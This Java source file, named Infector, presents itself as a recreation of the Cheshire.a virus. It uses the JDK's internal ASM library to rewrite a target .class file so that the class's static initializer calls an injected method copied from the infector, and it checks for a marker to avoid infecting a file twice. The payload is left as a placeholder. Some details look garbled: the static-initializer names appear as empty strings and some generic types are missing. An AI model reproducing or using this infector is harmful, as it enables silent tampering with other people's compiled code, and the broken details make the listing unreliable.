// To ignore internal compiler ref error:
// javac -XDignore.symbol.file Infector.java

// We do not need to use any libraries for class file parsing/writing, the JDK bundles it for us.
// However it is in a restricted module, so attempts to access it are disallowed by default. See note above.
import jdk.internal.org.objectweb.asm.ClassReader;
import jdk.internal.org.objectweb.asm.ClassVisitor;
import jdk.internal.org.objectweb.asm.ClassWriter;
import jdk.internal.org.objectweb.asm.MethodVisitor;
import jdk.internal.org.objectweb.asm.Opcodes;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Objects;
import java.util.function.Predicate;

/**
 * Recreation of Cheshire.a using the JDK's built in ASM library.
 */
public class Infector {
	private static final String IDENTIFIER = "cheshire";
	private static final int API = Opcodes.ASM5;

	public static void main(String[] args) {
		check("Missing arg: ", a -> a.length < 1, args);

		String path = args[0];
		byte[] code = read(path);
		check("Failed read: Invalid path or class file", Objects::isNull, code);
		check("Ignored: Class already infected", s -> s.contains(IDENTIFIER), new String(Objects.requireNonNull(code)));

		byte[] modified = infect(code);
		check("Failed infect: Error in infection logic", Objects::isNull, code);

		write(path, modified);
	}

	/**
	 * This method contains the code that will be injected into the class.
	 * 

	 * THIS METHOD MUST HAVE THE SAME NAME AS THE VALUE OF {@link #IDENTIFIER}
	 */
	private static void cheshire() {
		System.out.println("PLACE YOUR CODE HERE");
	}

	/**
	 * @param code
	 * 		Original class.
	 *
	 * @return Modified bytecode.
	 */
	private static byte[] infect(byte[] code) {
		boolean[] hasExistingBlock = new boolean[1];
		ClassReader reader = new ClassReader(code);
		ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
		ClassVisitor visitor = new ClassVisitor(API, writer) {
			@Override
			public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
				MethodVisitor mv = super.visitMethod(access, name, desc, signature, exceptions);
				// Create a wrapper visitor to infect the static initializer
				if (name.equals("")) {
					hasExistingBlock[0] = true;
					return new MethodVisitor(API, mv) {
						@Override
						public void visitCode() {
							injectStaticBlock(reader, this);
							super.visitCode();
						}
					};
				}
				return mv;
			}

			@Override
			public void visitEnd() {
				// Add a static block if it does not exist
				if (!hasExistingBlock[0]) {
					MethodVisitor mv = visitMethod(Opcodes.ACC_STATIC, "", "()V", null, null);
					mv.visitCode();
					mv.visitInsn(Opcodes.RETURN);
				}
				
				// Add infection method
				MethodVisitor mv = visitMethod(Opcodes.ACC_STATIC | Opcodes.ACC_SYNTHETIC, IDENTIFIER, "()V", null, null);
				createInfectionMethod(mv);
				super.visitEnd();
			}
		};
		reader.accept(visitor, ClassReader.EXPAND_FRAMES);
		return writer.toByteArray();
	}

	/**
	 * @param mv
	 * 		Visitor object to use to create the infection method.
	 * 		This is used to write new code into the class.
	 */
	private static void createInfectionMethod(MethodVisitor mv) {
		try {
			// Fetch the current class and visit itself, and when we visit the
			ClassReader selfReader = new ClassReader(Infector.class.getName());
			selfReader.accept(new ClassVisitor(API) {
				@Override
				public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
					// Only visit the identifier method, which contains the code we want to inject
					if (name.equals(IDENTIFIER))
						return mv;
					return null;
				}
			}, ClassReader.EXPAND_FRAMES);
		} catch (IOException e) {
			System.err.println("Failed to fetch self: " + e.getMessage());
		}
	}

	/**
	 * Called at the start of the visitation of the static initializer.
	 *
	 * @param reader
	 * 		Reader to pull class name from.
	 * @param mv
	 * 		Static block method visitor.
	 */
	private static void injectStaticBlock(ClassReader reader, MethodVisitor mv) {
		mv.visitMethodInsn(Opcodes.INVOKESTATIC, reader.getClassName(), IDENTIFIER, "()V", false);
	}

	/**
	 * @param path
	 * 		Path to class, overwrites it.
	 * @param modified
	 * 		Infected bytecode.
	 */
	private static void write(String path, byte[] modified) {
		try {
			Files.write(Paths.get(path), modified, StandardOpenOption.CREATE);
		} catch (IOException e) {
			System.err.println(e.getMessage());
		}
	}

	/**
	 * @param path
	 * 		Path to class.
	 *
	 * @return Class bytecode, or {@code null} if read failed.
	 */
	private static byte[] read(String path) {
		try {
			return Files.readAllBytes(Paths.get(path));
		} catch (IOException e) {
			System.err.println(e.getMessage());
			return null;
		}
	}

	/**
	 * Allow one-liner checks to simply main method logic.
	 *
	 * @param msg
	 * 		Fail message.
	 * @param check
	 * 		Check to run.
	 * @param arg
	 * 		Check argument.
	 * @param 
	 * 		Type of argument.
	 */
	private static  void check(String msg, Predicate check, T arg) {
		if (check.test(arg)) {
			System.err.println(msg);
			System.exit(-1);
		}
	}
}